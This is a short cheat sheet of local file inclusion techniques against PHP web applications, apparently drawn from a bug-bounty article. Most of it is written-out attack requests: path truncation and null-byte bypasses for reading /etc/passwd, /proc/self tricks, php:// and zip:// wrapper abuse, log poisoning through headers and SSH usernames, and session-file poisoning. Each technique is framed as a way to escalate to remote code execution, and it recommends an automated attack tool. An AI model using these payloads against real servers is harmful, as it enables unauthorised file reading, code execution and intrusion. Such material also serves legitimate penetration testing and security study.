### Description

Here are some techniques which can be helpful when exploiting the case of a LFI. Thanks to: _lavalamp, smiegles, arr0way, d.w., swisskey, rawsec_cyber, j.adriaans  This is a handy version of my article on Medium ([Link](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)).

* Useful tool: [LFISuite](https://github.com/D35m0nd142/LFISuite)

### Techniques
**[1] Path Truncation**  
Bypassing an extension-check by pushing the URL over its size (*4096* bytes)
```
GET file.php?name=../../etc/passwd/././././././././/././././././././././[ and so on ]
```

**[2] Nullbyte Injection**  
Bypassing an extension-check on PHP <= *v.5.3* environment through a nullbyte (=end of string)
```
GET file.php?name=../../etc/passwd%00
```

**[3] /proc/self**  
Expanding to RCE by setting and including the environment-var "User-Agent" through /proc/self (Apache2)
```
GET file.php?name=../../proc/self/environ
User-Agent: <?php phpinfo(); ?>
```
Expanding to RCE by including open file-descriptors (e.g. error-log) used by the current process (Apache2)
```
GET file.php?name=../../proc/self/fd/[ id; bruteforce them ]
Referer: <?php phpinfo(); ?>
```
**[4] PHP wrapper**  
Expanding to RCE by using different PHP wrappers to access I/O streams
```
POST file.php?name=php://input
<?php phpinfo(); ?>
---
GET file.php?name=php://filter/convert.base64-encode/resource=../index.php 
GET file.php?name=php://filter/read=string.rot13/resource=../index.php 
---
cmd: zip archive.zip payload.php ("<?php phpinfo(); ?>"), upload it to the server, optional: mv archive.zip image.jpg
GET file.php?name=zip://../uploads/archive.zip%23payload.php
```

**[5] Log poisoning**  
Expanding to RCE by pushing payload into log-files and including them
```
GET non-existent-file.php
Referer: <?php phpinfo();?>
---
GET file.php?name=../../var/log/nginx/error_log
```
Abusing the SSH daemon
```
ssh <?php phpinfo();?>@[ ip of target ]
--
GET file.php?name=../../var/log/auth.log
```

**[6] PHP Sessions**  
Expanding to RCE by storing the payload into the session, retrieving the session-file
 ```
POST login.php 
username=<?php phpinfo();?>&password=test
---
GET vulnerable.php?filename=../../var/lib/php[ version 5/7 ]/sess_[ session-id ]
```

**[7] phpinfo()**  
Expanding to RCE by abusing temporary file-creation of phpinfo()'s debug.
"LFISuite" can do that.
